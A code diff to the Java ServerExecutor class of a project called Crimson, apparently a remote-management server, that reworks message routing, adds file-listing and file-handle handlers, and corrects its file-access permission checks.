@@ -17,12 +17,14 @@
  *****************************************************************************/
 package com.subterranean_security.crimson.server.net;
 
+import java.io.IOException;
 import java.util.concurrent.TimeUnit;
 
 import org.slf4j.Logger;
 
 import com.google.protobuf.ByteString;
 import com.subterranean_security.crimson.core.Common.Instance;
+import com.subterranean_security.crimson.core.fm.LocalFilesystem;
 import com.subterranean_security.crimson.core.net.BasicExecutor;
 import com.subterranean_security.crimson.core.net.ConnectionState;
 import com.subterranean_security.crimson.core.proto.ClientAuth.Group;
@@ -33,6 +35,8 @@ import com.subterranean_security.crimson.core.proto.ClientAuth.RS_GroupChallenge
 import com.subterranean_security.crimson.core.proto.Delta.EV_ProfileDelta;
 import com.subterranean_security.crimson.core.proto.Delta.EV_ServerProfileDelta;
 import com.subterranean_security.crimson.core.proto.Delta.EV_ViewerProfileDelta;
+import com.subterranean_security.crimson.core.proto.FileManager.RQ_FileListing;
+import com.subterranean_security.crimson.core.proto.FileManager.RS_FileHandle;
 import com.subterranean_security.crimson.core.proto.FileManager.RS_FileListing;
 import com.subterranean_security.crimson.core.proto.Generator.GenReport;
 import com.subterranean_security.crimson.core.proto.Generator.RS_Generate;
@@ -100,13 +104,13 @@ public class ServerExecutor extends BasicExecutor {
 					} catch (InterruptedException e) {
 						return;
 					}
-					if (m.hasCid() && m.getCid() != 0) {
+					if (m.hasRid() && m.getRid() != 0) {
 						// route
-						log.debug("Routing message (CVID: {})", m.getCid());
+						log.debug("Routing message to CVID: {}", m.getRid());
 						try {
-							ServerStore.Connections.getConnection(m.getCid()).handle.write(m);
+							ServerStore.Connections.getConnection(m.getRid()).handle.write(m);
 						} catch (NullPointerException e) {
-							log.debug("Could not forward message (CVID: {})", m.getCid());
+							log.debug("Could not forward message to CVID: {}", m.getRid());
 						}
 					} else if (m.hasRqLogin()) {
 						new Thread(new Runnable() {
@@ -141,6 +145,10 @@ public class ServerExecutor extends BasicExecutor {
 						rq_change_server_state(m);
 					} else if (m.hasRqChangeClientState()) {
 						rq_change_client_state(m);
+					} else if (m.hasRqFileHandle()) {
+						rq_file_handle(m);
+					} else if (m.hasRsFileHandle()) {
+						rs_file_handle(m);
 					} else {
 						receptor.cq.put(m.getId(), m);
 					}
@@ -148,6 +156,7 @@ public class ServerExecutor extends BasicExecutor {
 					ReferenceCountUtil.release(m);
 				}
 			}
+
 		});
 		nbt.start();
 	}
@@ -281,26 +290,29 @@ public class ServerExecutor extends BasicExecutor {
 	}
 
 	private void ev_profileDelta(Message m) {
-		if (m.hasVid()) {
-			ServerStore.Connections.getConnection(m.getVid()).handle.write(m);
-		} else {
-			// TODO send original message when pd needs no modification
-			EV_ProfileDelta pd = m.getEvProfileDelta();
-			if (pd.hasExtIp()) {
-				if (pd.getExtIp().equals("0.0.0.0") && !receptor.getRemoteAddress().equals("127.0.0.1")) {
-					pd = EV_ProfileDelta.newBuilder().mergeFrom(pd).setExtIp(receptor.getRemoteAddress()).build();
-				}
-			}
-			for (int svid : ServerStore.Connections.getKeySet()) {
-				Receptor r = ServerStore.Connections.getConnection(svid);
-				// somehow check permissions TODO
 
-				if (r.getInstance() == Instance.VIEWER) {
-					r.handle.write(Message.newBuilder().setUrgent(true).setEvProfileDelta(pd).build());
+		// TODO use new id
+		// if (m.hasSid()) {
+		// ServerStore.Connections.getConnection(m.getSid()).handle.write(m);
+		// } else {
 
-				}
+		// TODO send original message when pd needs no modification
+		EV_ProfileDelta pd = m.getEvProfileDelta();
+		if (pd.hasExtIp()) {
+			if (pd.getExtIp().equals("0.0.0.0") && !receptor.getRemoteAddress().equals("127.0.0.1")) {
+				pd = EV_ProfileDelta.newBuilder().mergeFrom(pd).setExtIp(receptor.getRemoteAddress()).build();
 			}
 		}
+		for (int svid : ServerStore.Connections.getKeySet()) {
+			Receptor r = ServerStore.Connections.getConnection(svid);
+			// somehow check permissions TODO
+
+			if (r.getInstance() == Instance.VIEWER) {
+				r.handle.write(Message.newBuilder().setUrgent(true).setEvProfileDelta(pd).build());
+
+			}
+		}
+
 	}
 
 	private void login_rq(Message m) {
@@ -431,36 +443,56 @@ public class ServerExecutor extends BasicExecutor {
 	}
 
 	private void file_listing_rq(Message m) {
-		ViewerProfile vp = null;
-		try {
-			vp = ServerStore.Profiles.getViewer(m.getVid());
-		} catch (Exception e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
+		ViewerProfile vp = ServerStore.Profiles.getViewer(receptor.getCvid());
+
+		if (!PermissionTester.verifyServerPermission(vp.getPermissions(), "server_fs_read")) {
+			log.debug("Denied unauthorized file access to server from viewer: {}", receptor.getCvid());
 			return;
 		}
-		if (m.hasCid()) {
-			if (PermissionTester.verifyClientPermission(vp.getPermissions(), m.getCid(), "server_fs_read")) {
-				System.out.println("Permissions error");
-				return;
-			}
-			Receptor r = ServerStore.Connections.getConnection(m.getCid());
-			r.handle.write(m);
 
-		} else {
-			if (PermissionTester.verifyServerPermission(vp.getPermissions(), "server_fs_read")) {
-				System.out.println("Permissions error");
-				return;
-			}
-			receptor.handle.write(Message.newBuilder().setRsFileListing(RS_FileListing.newBuilder().addAllListing(null))
-					.setVid(m.getVid()).build());
+		RQ_FileListing rq = m.getRqFileListing();
+		LocalFilesystem lf = ServerStore.LocalFilesystems.get(rq.getFmid());
+		if (rq.hasUp() && rq.getUp()) {
+			lf.up();
+		} else if (rq.hasDown()) {
+			lf.down(rq.getDown());
 		}
+
+		try {
+			receptor.handle.write(Message.newBuilder().setId(m.getId())
+					.setRsFileListing(RS_FileListing.newBuilder().setPath(lf.pwd()).addAllListing(lf.list())).build());
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+
+		}
+	}
+
+	// TODO router?
+	private void file_listing_rs(Message m) {
+		Receptor r = ServerStore.Connections.getConnection(m.getSid());
+		r.handle.write(m);
+	}
+
+	private void rs_file_handle(Message m) {
+		log.debug("Got rs_file_handle for VID: " + m.getSid());
+		Receptor r = ServerStore.Connections.getConnection(m.getSid());
+		r.handle.write(m);
 
 	}
 
-	private void file_listing_rs(Message m) {
-		Receptor r = ServerStore.Connections.getConnection(m.getVid());
-		r.handle.write(m);
+	private void rq_file_handle(Message m) {
+		ViewerProfile vp = ServerStore.Profiles.getViewer(receptor.getCvid());
+
+		if (!PermissionTester.verifyServerPermission(vp.getPermissions(), "server_fs_read")) {
+			log.debug("Denied unauthorized file access to server from viewer: {}", receptor.getCvid());
+			return;
+		}
+		receptor.handle.write(Message.newBuilder().setId(m.getId())
+				.setRsFileHandle(
+						RS_FileHandle.newBuilder().setFmid(ServerStore.LocalFilesystems.add(new LocalFilesystem())))
+				.build());
+
 	}
 
 	private void stream_start_ev(Message m) {
